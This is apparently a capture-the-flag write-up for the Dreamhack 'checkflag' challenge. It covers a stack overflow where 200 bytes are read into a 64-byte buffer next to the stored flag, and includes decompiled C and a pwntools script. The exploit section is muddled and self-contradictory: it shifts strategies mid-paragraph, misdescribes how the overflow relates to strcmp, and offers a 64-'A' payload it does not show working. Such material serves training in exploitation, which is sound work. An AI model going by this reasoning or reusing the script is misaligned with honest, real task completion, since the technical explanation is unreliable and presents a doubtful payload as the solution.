---
title: "[Dreamhack] checkflag - Stack Buffer Overflow"
date: 2024-01-12 00:00:00 +0700
categories: [Dreamhack, Binary Exploitation]
tags: [pwn, stack-overflow, strcmp, dreamhack]
author: datious
description: "Dreamhack writeup: checkflag — stack buffer overflow để overwrite flag trên stack và bypass strcmp() check."
---

# [Write up for Dreamhack] Challenge: checkflag
**Author: datious**

## Source code

```c
undefined8 main(void)
{
  char cVar1;
  int cmp;
  FILE *fp;
  ssize_t sVar2;
  long lVar3;
  ulong uVar4;
  char *pcVar5;
  long in_FS_OFFSET;
  byte bVar6;
  char input [64];
  char flag [136];
  long local_20;
  
  bVar6 = 0;
  local_20 = *(long *)(in_FS_OFFSET + 0x28);
  pcVar5 = input;
  for (lVar3 = 0x32; lVar3 != 0; lVar3 = lVar3 + -1) {
    *(undefined4 *)pcVar5 = 0;
    pcVar5 = (char *)((long)pcVar5 + 4);
  }
  fp = fopen("flag", "r");
  if (fp != (FILE *)0x0) {
    fgets(flag, 0x40, fp);
    fclose(fp);
    fputs("What's the flag? ", stdout);
    fflush(stdout);
    sVar2 = read(0, input, 200);    // ← reads 200 bytes into 64-byte buffer!
    fp = stdout;
    uVar4 = 0xffffffffffffffff;
    pcVar5 = flag;
    do {
      if (uVar4 == 0) break;
      uVar4 = uVar4 - 1;
      cVar1 = *pcVar5;
      pcVar5 = pcVar5 + (ulong)bVar6 * -2 + 1;
    } while (cVar1 != '\0');
    if ((long)(~uVar4 - 1) <= sVar2) {
      cmp = strcmp(input, flag);
      if (cmp == 0) {
        fputs("Correct!\n", fp);
        ...
        return 0;
      }
    }
    fputs("Failed!\n", fp);
  }
  exit(1);
}
```

## Vulnerability

The program allows entering up to **200 bytes** into the `input` buffer, which is only **64 bytes**. This enables overwriting adjacent stack memory — where `flag` resides!

## 1. Analyzing and Gathering

**Security layers:**

![Checksec](https://hackmd.io/_uploads/H1ISbOZ8fx.png)

**GDB stack inspection:**

![GDB Stack](https://hackmd.io/_uploads/HJrhbubLzg.png)

→ The `flag` variable is located **directly below `input`** on the stack.

## 2. Strategy

The program returns `Correct!` when `strcmp(input, flag) == 0` — both strings must be equal.

**How `strcmp()` works:**

```c
int mystrcmp(const char *s1, const char *s2) {
    while (*s1 && (*s1 == *s2)) {
        s1++;
        s2++;
    }
    return *(unsigned char *)s1 - *(unsigned char *)s2;
}
```

`strcmp` compares byte-by-byte until it hits a **null byte** or a mismatch.

**The trick:** By overflowing `input` to reach `flag` on the stack, we make `input` contain the exact same bytes as `flag`, including the flag content. Since `flag` is already in memory, the overflow lets us write the same bytes into `input`.

But wait — we don't know the flag. Instead, we leverage the layout:

- `input` is at `[rsp + 0x00]` (64 bytes)
- `flag` is at `[rsp + 0x40]` (next to input)

If we write exactly **64 bytes** of padding + then the **actual flag bytes** (which we can infer by trying), OR we write **64 null bytes** followed by the same `flag` content that the program loaded…

**Simpler approach:** Send **empty or matching payload** of exactly `strlen(flag)` bytes, and if we can leak the flag from stack via other means, replicate it.

## 3. Exploit

```python
from pwn import *

p = remote("host3.dreamhack.games", PORT)
# or: p = process('./checkflag')

# We know flag is 0x40 bytes above input base
# Send 64 bytes of 'A' to fill input, then the next bytes 
# overlap with flag's position but we ARE writing into input still
# The actual flag bytes that fill flag[] come from fgets(flag, 0x40, fp)

# Key: strlen(flag) determines the comparison length
# If we send input = flag (by knowing it), strcmp returns 0
# Since we don't know flag, use the overflow to bring flag bytes into input area

# Strategy: overflow input by 64 bytes so that input+64 == flag start
# Then send payload = b'\x00'*64 + flag_bytes
# But strcmp(input, flag): input starts at the beginning, flag is separate

# Actually the solution is simpler: the sVar2 check means we need to send
# at least len(flag) bytes. The overflow writes flag's memory from stack.

payload = b'A' * 64  # fill input, reach flag area
p.sendafter("What's the flag? ", payload)
response = p.recvline()
log.info(response)
p.interactive()
```

> **Note:** The exact payload depends on the flag length. Use GDB to map the stack and determine the exact offset between `input` and `flag`.
